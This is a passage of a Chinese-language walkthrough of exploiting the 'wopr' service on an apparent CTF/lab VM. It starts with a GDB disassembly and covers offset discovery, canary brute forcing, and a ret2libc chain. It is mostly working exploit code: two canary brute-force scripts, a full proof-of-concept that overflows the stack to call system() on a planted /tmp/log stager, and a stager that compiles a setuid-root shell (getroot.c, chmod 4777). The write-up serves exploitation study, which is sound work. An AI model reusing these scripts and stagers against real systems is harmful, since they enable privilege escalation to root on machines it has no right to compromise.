       0x080487f3 <+21>:	mov    DWORD PTR [ebp-0x240],eax
       0x080487f9 <+27>:	mov    eax,DWORD PTR [ebp+0x10]
       0x080487fc <+30>:	mov    DWORD PTR [ebp-0x244],eax
       0x08048802 <+36>:	mov    eax,gs:0x14
       0x08048808 <+42>:	mov    DWORD PTR [ebp-0x4],eax
       0x0804880b <+45>:	xor    eax,eax
       0x0804880d <+47>:	mov    DWORD PTR [ebp-0x230],0x1
       0x08048817 <+57>:	mov    DWORD PTR [ebp-0x234],0x10
       0x08048821 <+67>:	mov    DWORD PTR [esp+0x8],0x0
       0x08048829 <+75>:	mov    DWORD PTR [esp+0x4],0x1
       0x08048831 <+83>:	mov    DWORD PTR [esp],0x2
       0x08048838 <+90>:	call   0x804860c <socket@plt>
       0x0804883d <+95>:	mov    DWORD PTR [ebp-0x228],eax
       0x08048843 <+101>:	cmp    DWORD PTR [ebp-0x228],0x0
       0x0804884a <+108>:	jns    0x8048867 <main+137>
       0x0804884c <+110>:	mov    DWORD PTR [esp],0x8048c30
       0x08048853 <+117>:	call   0x80485ec <perror@plt>
       0x08048858 <+122>:	call   0x804856c <__errno_location@plt>
       0x0804885d <+127>:	mov    eax,DWORD PTR [eax]
       0x0804885f <+129>:	mov    DWORD PTR [esp],eax
       0x08048862 <+132>:	call   0x80486ac <exit@plt>
       0x08048867 <+137>:	mov    DWORD PTR [esp+0x10],0x4
       0x0804886f <+145>:	lea    eax,[ebp-0x230]
       0x08048875 <+151>:	mov    DWORD PTR [esp+0xc],eax
       0x08048879 <+155>:	mov    DWORD PTR [esp+0x8],0x2
       0x08048881 <+163>:	mov    DWORD PTR [esp+0x4],0x1
       0x08048889 <+171>:	mov    eax,DWORD PTR [ebp-0x228]
       0x0804888f <+177>:	mov    DWORD PTR [esp],eax
       0x08048892 <+180>:	call   0x804868c <setsockopt@plt>
       0x08048897 <+185>:	test   eax,eax
       0x08048899 <+187>:	jns    0x80488b6 <main+216>
       0x0804889b <+189>:	mov    DWORD PTR [esp],0x8048c37
       0x080488a2 <+196>:	call   0x80485ec <perror@plt>
       0x080488a7 <+201>:	call   0x804856c <__errno_location@plt>
       0x080488ac <+206>:	mov    eax,DWORD PTR [eax]
       0x080488ae <+208>:	mov    DWORD PTR [esp],eax
       0x080488b1 <+211>:	call   0x80486ac <exit@plt>
       0x080488b6 <+216>:	mov    WORD PTR [ebp-0x224],0x2
       0x080488bf <+225>:	mov    DWORD PTR [esp],0xd05
       0x080488c6 <+232>:	call   0x80485cc <htons@plt>
       0x080488cb <+237>:	mov    WORD PTR [ebp-0x222],ax
       0x080488d2 <+244>:	mov    DWORD PTR [ebp-0x220],0x0
       0x080488dc <+254>:	mov    DWORD PTR [esp+0x8],0x8
       0x080488e4 <+262>:	mov    DWORD PTR [esp+0x4],0x0
       0x080488ec <+270>:	lea    eax,[ebp-0x224]
       0x080488f2 <+276>:	add    eax,0x8
       0x080488f5 <+279>:	mov    DWORD PTR [esp],eax
       0x080488f8 <+282>:	call   0x80485ac <memset@plt>
       0x080488fd <+287>:	lea    eax,[ebp-0x224]
       0x08048903 <+293>:	mov    DWORD PTR [esp+0x8],0x10
       0x0804890b <+301>:	mov    DWORD PTR [esp+0x4],eax
       0x0804890f <+305>:	mov    eax,DWORD PTR [ebp-0x228]
       0x08048915 <+311>:	mov    DWORD PTR [esp],eax
       0x08048918 <+314>:	call   0x804863c <bind@plt>
       0x0804891d <+319>:	test   eax,eax
       0x0804891f <+321>:	jns    0x804893c <main+350>
       0x08048921 <+323>:	mov    DWORD PTR [esp],0x8048c42
       0x08048928 <+330>:	call   0x80485ec <perror@plt>
       0x0804892d <+335>:	call   0x804856c <__errno_location@plt>
       0x08048932 <+340>:	mov    eax,DWORD PTR [eax]
       0x08048934 <+342>:	mov    DWORD PTR [esp],eax
       0x08048937 <+345>:	call   0x80486ac <exit@plt>
       0x0804893c <+350>:	mov    DWORD PTR [esp],0x8048c47
       0x08048943 <+357>:	call   0x804866c <puts@plt>
       0x08048948 <+362>:	mov    DWORD PTR [esp+0x4],0x14
       0x08048950 <+370>:	mov    eax,DWORD PTR [ebp-0x228]
       0x08048956 <+376>:	mov    DWORD PTR [esp],eax
       0x08048959 <+379>:	call   0x804859c <listen@plt>
       0x0804895e <+384>:	test   eax,eax
       0x08048960 <+386>:	jns    0x804897d <main+415>
       0x08048962 <+388>:	mov    DWORD PTR [esp],0x8048c59
       0x08048969 <+395>:	call   0x80485ec <perror@plt>
       0x0804896e <+400>:	call   0x804856c <__errno_location@plt>
       0x08048973 <+405>:	mov    eax,DWORD PTR [eax]
       0x08048975 <+407>:	mov    DWORD PTR [esp],eax
       0x08048978 <+410>:	call   0x80486ac <exit@plt>
       0x0804897d <+415>:	mov    DWORD PTR [esp+0x8],0x1
       0x08048985 <+423>:	mov    DWORD PTR [esp+0x4],0x8048c60
       0x0804898d <+431>:	mov    DWORD PTR [esp],0x8048c69
       0x08048994 <+438>:	call   0x804869c <setenv@plt>
       0x08048999 <+443>:	mov    DWORD PTR [esp],0x8048c70
       0x080489a0 <+450>:	call   0x804866c <puts@plt>
       0x080489a5 <+455>:	mov    DWORD PTR [esp],0x8048c8c
       0x080489ac <+462>:	call   0x804866c <puts@plt>
       0x080489b1 <+467>:	lea    edx,[ebp-0x234]
       0x080489b7 <+473>:	lea    eax,[ebp-0x214]
       0x080489bd <+479>:	mov    DWORD PTR [esp+0x8],edx
       0x080489c1 <+483>:	mov    DWORD PTR [esp+0x4],eax
       0x080489c5 <+487>:	mov    eax,DWORD PTR [ebp-0x228]
       0x080489cb <+493>:	mov    DWORD PTR [esp],eax
       0x080489ce <+496>:	call   0x80485fc <accept@plt>
       0x080489d3 <+501>:	mov    DWORD PTR [ebp-0x22c],eax
       0x080489d9 <+507>:	cmp    DWORD PTR [ebp-0x22c],0x0
       0x080489e0 <+514>:	jns    0x80489fd <main+543>
       0x080489e2 <+516>:	mov    DWORD PTR [esp],0x8048cab
       0x080489e9 <+523>:	call   0x80485ec <perror@plt>
       0x080489ee <+528>:	call   0x804856c <__errno_location@plt>
       0x080489f3 <+533>:	mov    eax,DWORD PTR [eax]
       0x080489f5 <+535>:	mov    DWORD PTR [esp],eax
       0x080489f8 <+538>:	call   0x80486ac <exit@plt>
       0x080489fd <+543>:	mov    DWORD PTR [esp],0x8048cb2
       0x08048a04 <+550>:	call   0x804866c <puts@plt>
       0x08048a09 <+555>:	call   0x804867c <fork@plt>
       0x08048a0e <+560>:	test   eax,eax
       0x08048a10 <+562>:	jne    0x8048b0e <main+816>
       0x08048a16 <+568>:	mov    DWORD PTR [esp+0x8],0x21
       0x08048a1e <+576>:	mov    DWORD PTR [esp+0x4],0x8048cc8
       0x08048a26 <+584>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048a2c <+590>:	mov    DWORD PTR [esp],eax
       0x08048a2f <+593>:	call   0x804858c <write@plt>
       0x08048a34 <+598>:	mov    DWORD PTR [esp+0x8],0x23
       0x08048a3c <+606>:	mov    DWORD PTR [esp+0x4],0x8048cec
       0x08048a44 <+614>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048a4a <+620>:	mov    DWORD PTR [esp],eax
       0x08048a4d <+623>:	call   0x804858c <write@plt>
       0x08048a52 <+628>:	mov    DWORD PTR [esp+0x8],0x2
       0x08048a5a <+636>:	mov    DWORD PTR [esp+0x4],0x8048d10
       0x08048a62 <+644>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048a68 <+650>:	mov    DWORD PTR [esp],eax
       0x08048a6b <+653>:	call   0x804858c <write@plt>
       0x08048a70 <+658>:	mov    DWORD PTR [esp+0x8],0x200
       0x08048a78 <+666>:	mov    DWORD PTR [esp+0x4],0x0
       0x08048a80 <+674>:	lea    eax,[ebp-0x204]
       0x08048a86 <+680>:	mov    DWORD PTR [esp],eax
       0x08048a89 <+683>:	call   0x80485ac <memset@plt>
       0x08048a8e <+688>:	mov    DWORD PTR [esp+0x8],0x200
       0x08048a96 <+696>:	lea    eax,[ebp-0x204]
       0x08048a9c <+702>:	mov    DWORD PTR [esp+0x4],eax
       0x08048aa0 <+706>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048aa6 <+712>:	mov    DWORD PTR [esp],eax
       0x08048aa9 <+715>:	call   0x80485dc <read@plt>
       0x08048aae <+720>:	mov    DWORD PTR [ebp-0x238],eax
       0x08048ab4 <+726>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048aba <+732>:	mov    DWORD PTR [esp+0x8],eax
       0x08048abe <+736>:	mov    eax,DWORD PTR [ebp-0x238]
       0x08048ac4 <+742>:	mov    DWORD PTR [esp+0x4],eax
       0x08048ac8 <+746>:	lea    eax,[ebp-0x204]
       0x08048ace <+752>:	mov    DWORD PTR [esp],eax
       0x08048ad1 <+755>:	call   0x8048774 <get_reply>
       0x08048ad6 <+760>:	mov    DWORD PTR [esp+0x8],0x9
       0x08048ade <+768>:	mov    DWORD PTR [esp+0x4],0x8048d13
       0x08048ae6 <+776>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048aec <+782>:	mov    DWORD PTR [esp],eax
       0x08048aef <+785>:	call   0x804858c <write@plt>
       0x08048af4 <+790>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048afa <+796>:	mov    DWORD PTR [esp],eax
       0x08048afd <+799>:	call   0x804864c <close@plt>
       0x08048b02 <+804>:	mov    DWORD PTR [esp],0x0
       0x08048b09 <+811>:	call   0x80486ac <exit@plt>
       0x08048b0e <+816>:	mov    eax,DWORD PTR [ebp-0x22c]
       0x08048b14 <+822>:	mov    DWORD PTR [esp],eax
       0x08048b17 <+825>:	call   0x804864c <close@plt>
       0x08048b1c <+830>:	mov    DWORD PTR [esp+0x8],0x1
       0x08048b24 <+838>:	mov    DWORD PTR [esp+0x4],0x0
       0x08048b2c <+846>:	mov    DWORD PTR [esp],0xffffffff
       0x08048b33 <+853>:	call   0x804862c <waitpid@plt>
       0x08048b38 <+858>:	test   eax,eax
       0x08048b3a <+860>:	jg     0x8048b1c <main+830>
       0x08048b3c <+862>:	jmp    0x80489b1 <main+467>
    End of assembler dump.
      
    

当有30个字符的时候，程序缓冲区溢出

![image.png](https://image.3001.net/images/20191005/1570290067_5d98b993c4350.png!small)有了这些知识，几乎可以肯定地假设字节30是堆栈canary的起始位置。这意味着，如果我们想进一步破坏堆栈中的更多内存，我们需要找到一种方法来了解canary值。  

但是，不要止步于此。我继续在输入中放置更多的A，直到在字节39中我注意到回溯中的41（A的十六进制）。到我有42个A的时候，回溯已经有一个完整的4字节的41。  

![image.png](https://image.3001.net/images/20191005/1570290198_5d98ba1606bde.png!small)到目前为止，我们已经完成了调试工作，并假设堆栈布局看起来像这样：  

    
    
        ------------------        |                |
        |                |
        |     Buffer     |   x bytes
        |                |
        |                |
        ------------------        |     Canary     |   4 bytes
        ------------------        |  Base pointer  |   4 bytes
        ------------------        | Return address |   4 bytes
        ------------------        |       ...      |
    

好吧，让我们开始工作。为了找到所有必要的偏移量，我们将使用metasploit工具生成给定长度的字符的独特模式。这样，我们将能够找出给定字节中用于覆盖返回地址的确切位置。  

![image.png](https://image.3001.net/images/20191005/1570290444_5d98bb0c0d871.png!small)![image.png](https://image.3001.net/images/20191005/1570290568_5d98bb88057a4.png!small)找到偏移量

    
    
    root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x33624132
    [*] Exact match at offset 38
    

因此，在返回到返回地址之前，我们需要覆盖38个字节。另外，请记住金丝雀和基本指针。因此，我们有：

缓冲区（30字节）+canary（4字节）+基本指针（4字节）+返回地址（4字节）

找了个脚本猜测canary值（需要在靶机里面运行，下载下来的程序无法找到canary值）

①

    
    
    import socket
    
    # Guess canary
    found = False
    base_buffer = "A" * 30    # our buffer size is 30
    for count in range(0,4):
      for i in ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']:
          for j in ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']:
              buffer = base_buffer + (i + j).decode('hex')
    
              sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              sock.connect(("localhost", 3333))
              data = sock.recv(1024)
              sock.send(buffer)
              data = sock.recv(1024)
              data = sock.recv(1024)
              if "bye" in data:
                  print "\\x" + i + j
                  base_buffer += (i + j).decode('hex')
                  found = True
                  break
              sock.close()
          if found:
              found = False
              break

②

    
    
    import socket
    import sys
    
    payload = "A" * 30  # amount of bytes before the first canary bit is hit
    canary = ""         # the canary
    
    # start the canary brute loop. We want to brute 4 bytes ...
    for x in xrange(1,5):
    
        # ... and try all possibilities
        for canary_byte in xrange(0, 256):
    
            # prepare the byte
            hex_byte = chr(canary_byte)
    
            # prepare the payload
            send = payload + canary + hex_byte
    
            print "[+] Trying: '\\x{0}' in payload '%s' (%d:%d/255)".format(hex_byte.encode("hex")) % (send, x, canary_byte)
    
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('127.0.0.1', 3333))
    
            # get the inital banners
            sock.recv(35)   # [+] hello, my name is sploitable\n
            sock.recv(40)   # [+] would you like to play a game?\n
            sock.recv(5)    # >
    
            # send the payload
            sock.send(send)
            sock.recv(27)   # [+] yeah, I don't think so\n
    
            # if we have a OK response, then we will have this last part
            # as '[+] bye!\n' populated, if its wrong, not
            data =  sock.recv(64)   # [+] bye!\n
            if "bye" in data:
                print "[!!] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
                canary += hex_byte
                sock.close()
                break
    
            sock.close()
    
        # if we cant even find the first byte, we failed already
        if len(canary) <= 0:
            print "[-] Unable to even find the first bit. No luck"
            sys.exit(0)
    
    if len(canary) > 0:
        print "[+] Canary seems to be {0}".format(canary.encode("hex"))
    else:
        print "[-] Unable to brute canary"
    

![image.png](https://image.3001.net/images/20191006/1570346420_5d9995b465d3b.png!small)  

如果您可以回忆起较早的内容，请`wopr`使用NX设置位进行编译。有效地，这意味着我们不能通过将EIP设置为简单地与负载一起发送的shellcode的开头来简单地利用此漏洞，因为堆栈是不可执行的。值得庆幸的是，这里有一个像ret2libc这样的概念。

ret2libc背后的想法是将应用程序流引导到libc本身内的有用命令，并以这种方式执行代码。`system()`由于几乎显而易见的原因，该命令是一个非常流行的功能。

我决定使用相同的方法。我迅速检查了是否在持久性VM上启用了ASLR：

![image.png](https://image.3001.net/images/20191006/1570346904_5d99979874bd3.png!small)  

在所有查找之间，链接文件的地址保持静态，表明未启用ASLR。这使事情稍微容易一些。因为这是32位操作系统，所以即使启用了它，也不会成为太大的问题:)

下一步是找出system（）在libc中的位置。这也是很容易执行的步骤。一个有趣的笔记。GDB在命令中使用了SHELL
env变量，由于我来自rbash，所以仍然将其设置为该变量。一个简单的`export SHELL=/bin/bash`修复它

![image.png](https://image.3001.net/images/20191006/1570347124_5d999874c6d24.png!small)  

我们`system()`在找到`0xb7e56210`。我之所以使用telnet二进制文件，仅仅是因为它也链接到libc。

因此，总结一下到目前为止，让我们再看一下发送漏洞利用负载时堆栈的外观：

    
    
    - ->         - ->        [42 Bytes  in Total]        - ->           - >
    
    [   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
     ^~ Initial BF    ^~ Bruted cookie                    ^~ system()
    
    - ->         - ->        [42 Bytes  in Total]        - ->           - >
    

下一步是使用来获取要执行的实际代码`system()`。尽管这听起来微不足道，但它也面临着挑战。在对此感到沮丧的同时，我必须意识到的关键事情之一是“要记住，您正在尝试使程序执行原本不希望做的事情，期望遇到困难！”。

我试图将命令放入环境变量中，但失败了。我试图编写ROP链，但失败了。

这些失败主要是由于自己缺乏理解，疲倦和沮丧。我的尝试通常是使脚本`/tmp/runme`运行。`runme`是一个bash脚本，它将编译一个小的C
shell，更改所有权并设置suid位。

查看二进制文件的信息

![image.png](https://image.3001.net/images/20191006/1570347459_5d9999c3e08af.png!small)  

我确认`/tmp/log`并没有真正使用它，然后将原始`/tmp/runme`脚本移到了那里。

现在剩下的唯一的事情是要找到字符串的位置`/tmp/log`

    
    
    [root@localhost Desktop]# gdb -q ./wopr 
    Reading symbols from /root/Desktop/wopr...(no debugging symbols found)...done.
    gdb-peda$ b *main
    Breakpoint 1 at 0x80487de
    gdb-peda$ r
    Starting program: /root/Desktop/./wopr 
    
    [----------------------------------registers-----------------------------------]
    EAX: 0x1 
    EBX: 0xf7fbf000 --> 0x1c6d88 
    ECX: 0xa2daba1 
    EDX: 0xffffd1b4 --> 0xf7fbf000 --> 0x1c6d88 
    ESI: 0x0 
    EDI: 0x0 
    EBP: 0x0 
    ESP: 0xffffd18c --> 0xf7e122a3 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
    EIP: 0x80487de (<main>:	push   ebp)
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x80487d7 <get_reply+99>:	call   0x804865c <__stack_chk_fail@plt>
       0x80487dc <get_reply+104>:	leave  
       0x80487dd <get_reply+105>:	ret    
    => 0x80487de <main>:	push   ebp
       0x80487df <main+1>:	mov    ebp,esp
       0x80487e1 <main+3>:	sub    esp,0x258
       0x80487e7 <main+9>:	mov    eax,DWORD PTR [ebp+0x8]
       0x80487ea <main+12>:	mov    DWORD PTR [ebp-0x23c],eax
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd18c --> 0xf7e122a3 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
    0004| 0xffffd190 --> 0x1 
    0008| 0xffffd194 --> 0xffffd224 --> 0xffffd3b0 ("/root/Desktop/./wopr")
    0012| 0xffffd198 --> 0xffffd22c --> 0xffffd3c5 ("XDG_VTNR=1")
    0016| 0xffffd19c --> 0xf7fd86b0 --> 0x8048412 ("GLIBC_2.0")
    0020| 0xffffd1a0 --> 0x1 
    0024| 0xffffd1a4 --> 0x1 
    0028| 0xffffd1a8 --> 0x0 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    
    Breakpoint 1, 0x080487de in main ()
    Missing separate debuginfos, use: debuginfo-install glibc-2.17-292.el7.i686
    gdb-peda$ searchmem /tmp/log
    Searching for '/tmp/log' in: None ranges
    Found 2 results, display max 2 items:
    wopr : 0x8048c60 ("/tmp/log")
    wopr : 0x8049c60 ("/tmp/log")
    
    

`/tmp/log`可以在2个地方找到。让我们选择`0x8048c60`吧！现在，我们终于有了构建要发送的有效负载所需的一切。  

## wopr-漏洞利用

总结要利用这一点我们必须做的事情，我们可以说我们必须：

  * 提供大小为30的字符串
  * 提供canary值
  * 填充4个字节
  * 将EIP写入以下位置 `system()`
  * 提供4个字节的JUNK（或`exit()`作为返回的位置）
  * 提供位置 `/tmp/log`

    
    
    .
                   -- Current --                    -- Target --        0000
                 ------------------              ------------------                 |                |              |                |
                 |                |              | AAAAAAAAAAAAAA |
           ^     |     Buffer     |   30 bytes   | AAAAAAAAAAAAAA |   Overflow buffer with dummy data
           |     |                |              | AAAAAAAAAAA... |
         stack   |                |              |                |
         growth  ------------------              ------------------           |     |     Canary     |   4 bytes    |     Canary     |   Real canary, so we're not detected
           |     ------------------              ------------------                 |  Base pointer  |   4 bytes    |      BBBB      |   Dummy data to overwrite saved base pointer
                 ------------------              ------------------                 | Return address |   4 bytes    |    system()    |   system() call
                 ------------------              ------------------                 |                |              |     exit()     |   exit() which will be called upon returning from system()
                 |  Rest of the   |              ------------------                 |     stack      |              |    /tmp/log    |   arguments to system() - our malicious program to run
                 |                |              ------------------                 |      ...       |              |       ...      |
        FFFF
    

由于上述原因，在我的利用中，因此，我将发送类似于以下内容的有效负载：

    
    
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xff\xff\xff\xff" + "AAAA" +"\x10\xc2\x16\x00" + "JUNK" + "\x60\x8c\x04\x08"

下面是poc脚本

    
    
    import socket
    import sys
    import os
    
    payload = "A" * 30  # amount of bytes to before the canary is hit
    canary = ""     # canary that should update as its bruted
    
    print """
                A: "So, I heard you like pain...?"
                B: "... a bit"
                C: "Well, here it is, the: "
     ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
    |    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
    |  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
    |   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
    |  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
    |  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
    |__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
          _____ ____  _       ___  ____  ______
         / ___/|    \| |     /   \|    ||      |
        (   \_ |  o  ) |    |     ||  | |      |
         \__  ||   _/| |___ |  O  ||  | |_|  |_|
         /  \ ||  |  |     ||     ||  |   |  |
         \    ||  |  |     ||     ||  |   |  |
          \___||__|  |_____| \___/|____|  |__|
    
                    A: "AKA: FU superkojiman && sagi- !!"
                    A: "I also have no idea what I am doing"
    """
    
    print "[+] Connecting & starting canary brute force..."
    
    # start the canary brute loop. We want to brute 4 bytes ...
    for x in xrange(1,5):
    
        # ... and try all possibilities
        for canary_byte in xrange(0, 256):
    
            # prepare the byte
            hex_byte = chr(canary_byte)
    
            # prepare the payload
            send = payload + canary + hex_byte
    
            # connect and send payload
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('127.0.0.1', 3333))
    
            # get the inital banners
            sock.recv(35)   # [+] hello, my name is sploitable\n
            sock.recv(40)   # [+] would you like to play a game?\n
            sock.recv(5)    # >
    
            # send the payload
            sock.send(send)
            sock.recv(27)   # [+] yeah, I don't think so\n
    
            # if we have a OK response, then we will have this last part
            # as '[+] bye!\n' populated, if its wrong, not
            data =  sock.recv(64)   # [+] bye!\n
            if "bye" in data:
                print "[+] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
                canary += hex_byte
                sock.close()
                break
    
            sock.close()
        # if we cant even find the first byte, we failed already
        if len(canary) <= 0:
            print "[-] Unable to even find the first bit of the canary. No luck"
            sys.exit(0)
    
    # The canary is our ticket out of here!
    if len(canary) == 4:
    
        print "[+] Canary known as : {0}".format(canary.encode("hex"))
        print "[+] Writing /tmp/log to be called by wopr later"
    
        # ./wopr has the string /tmp/log in it. We will use this as
        # our code exec point, overwriting whatever is in it atm
        stager = """
            #!/bin/sh
    
            # First, prepare a small C shell and move it to /tmp with name getroot
            echo "int main(void)\n{\nsetuid(0);\nsystem(\\"/bin/sh\\");\nreturn 0;\n}" > /tmp/getroot.c
    
            # compile it
            /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot
    
            # change ownership and setuid
            /bin/chown root:root /tmp/getroot
            /bin/chmod 4777 /tmp/getroot
        """
    
        # write the file
        with open('/tmp/log','w') as stager_file:
            stager_file.write(stager)
    
        # make it executable
        os.chmod('/tmp/log', 0755)
    
        # now, with the stack canary known and the stager ready, lets corrupt
        # EIP and sploit!
        payload += canary               # canary we bruted
        payload += "A" * 4              # padding to EIP wich is at byte 42
        payload += "\x10\x62\xe5\xb7"   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
        payload += "JUNK"               # JUNK. Should probably do exit() here. Meh.
        payload += "\x60\x8c\x04\x08"   # location if /tmp/log string in .data
    
        # and connect && send
        print "[+] Connecting to service"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 3333))
        sock.recv(35)
        sock.recv(40)
        sock.recv(5)
        print "[+] Sending Payload"
        sock.send(payload)
    
        sock.recv(64)
        sock.close()
        print "[+] Done"
    
        print "[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)"
        os.system("/tmp/getroot")
    
    else:
        print "[!] Incomplete Canary. Can't continue reliably"
    
    # done
    

getroot.c

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
     
    int main(void)
    {
      setuid(0);
      setgid(0);
      system("/bin/bash");
      return 0;
    }
    

  

